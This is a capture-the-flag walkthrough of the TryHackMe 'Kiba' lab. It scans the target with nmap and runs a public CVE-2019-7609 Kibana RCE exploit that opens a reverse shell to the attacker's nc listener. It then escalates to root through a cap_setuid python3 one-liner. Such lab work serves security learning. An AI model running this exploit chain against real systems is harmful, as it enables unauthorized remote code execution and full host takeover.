# Kiba

# Flags

What is the vulnerability that is specific to programming languages with prototype-based inheritance? Prototype pollution

* https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/

What is the version of visualization dashboard installed in the server? 6.5.4

```
nmap -sCV 10.10.249.55 -p- -T4                                                                                                                     3 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 10:35 CDT
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.88% done; ETC: 10:47 (0:09:56 remaining)
Stats: 0:02:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 21.22% done; ETC: 10:48 (0:09:35 remaining)
Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 27.80% done; ETC: 10:48 (0:09:11 remaining)
Stats: 0:04:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 31.92% done; ETC: 10:48 (0:08:47 remaining)
Stats: 0:06:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 44.42% done; ETC: 10:49 (0:07:44 remaining)
Nmap scan report for 10.10.249.55
Host is up (0.12s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Mon, 19 Apr 2021 16:22:13 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Mon, 19 Apr 2021 16:22:09 GMT
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Mon, 19 Apr 2021 16:22:10 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.91%I=7%D=4/19%Time=607DA6F9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nk
SF:bn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6
SF:c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\
SF:x20close\r\nDate:\x20Mon,\x2019\x20Apr\x202021\x2016:22:09\x20GMT\r\n\r
SF:\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x
SF:20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\nconte
SF:nt-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-
SF:cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Mon,
SF:\x2019\x20Apr\x202021\x2016:22:10\x20GMT\r\n\r\n{\"statusCode\":404,\"e
SF:rror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLS
SF:essionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalSe
SF:rverCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessio
SF:nReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not
SF:\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d049232
SF:83ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=utf-8\
SF:r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x
SF:20close\r\nDate:\x20Mon,\x2019\x20Apr\x202021\x2016:22:13\x20GMT\r\n\r\
SF:n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Fo
SF:und\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPB
SF:indReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 936.03 seconds
```

What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
CVE-2019-7609

```
git clone https://github.com/--------/CVE-2019-7609.git
Cloning into 'CVE-2019-7609'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 13 (delta 2), reused 8 (delta 1), pack-reused 0
Receiving objects: 100% (13/13), 33.26 KiB | 540.00 KiB/s, done.
Resolving deltas: 100% (2/2), done
```

Compromise the machine and locate user.txt
Answer format: THM{1s_easy_-----_------_w1th_rce}

```
python2 CVE-2019-7609-kibana-rce.py -u http://10.10.249.55:5601 -port 8888 --shell
[+] http://10.10.249.55:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: 10.9.239.22:8888

nc -lvnp 8888                                                                                                                                      3 ⚙
listening on [any] 8888 ...
connect to [10.9.239.22] from (UNKNOWN) [10.10.249.55] 49490
bash: cannot set terminal process group (957): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ ls -la
ls -la
total 20
drwxr-xr-x  2 kiba kiba 4096 Dec 17  2018 .
drwxrwxr-x 11 kiba kiba 4096 Dec 17  2018 ..
-rwxr-xr-x  1 kiba kiba  632 Dec 17  2018 kibana
-rwxr-xr-x  1 kiba kiba  588 Dec 17  2018 kibana-keystore
-rwxr-xr-x  1 kiba kiba  639 Dec 17  2018 kibana-plugin
kiba@ubuntu:/home/kiba/kibana/bin$ cd ..
cd ..
kiba@ubuntu:/home/kiba/kibana$ ls
ls
LICENSE.txt
NOTICE.txt
README.txt
bin
config
data
node
node_modules
optimize
package.json
plugins
src
webpackShims
kiba@ubuntu:/home/kiba/kibana$ cd ..
cd ..
kiba@ubuntu:/home/kiba$ ls
ls
elasticsearch-6.5.4.deb
kibana
user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_easy_-----_------_w1th_rce}
kiba@ubuntu:/home/kiba$
```

No answer needed
How would you recursively list all of these capabilities?

Answer format: getcap -r /
```
Failed to get capabilities of file `/sys/kernel/security/apparmor/.access' (Operation not supported)
Failed to get capabilities of file `/dev/pts/0' (Operation not supported)
Failed to get capabilities of file `/dev/pts/ptmx' (Operation not supported)
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```


Escalate privileges and obtain root.txt
```
<kmeplease$ ./python3 'import os: os.setuid(0); os.system("/bin/bash")'      
./python3: can't open file 'import os: os.setuid(0); os.system("/bin/bash")': [Errno 2] No such file or directory
kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<kmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   
whoami
root
pwd      
/home/kiba/.hackmeplease
cd /root
pwd
/root
ls
root.txt
ufw
cat root.txt
THM{pr1v1lege_----------_us1ng_------------}
```

Answer format: THM{pr1v1lege_----------_us1ng_------------}
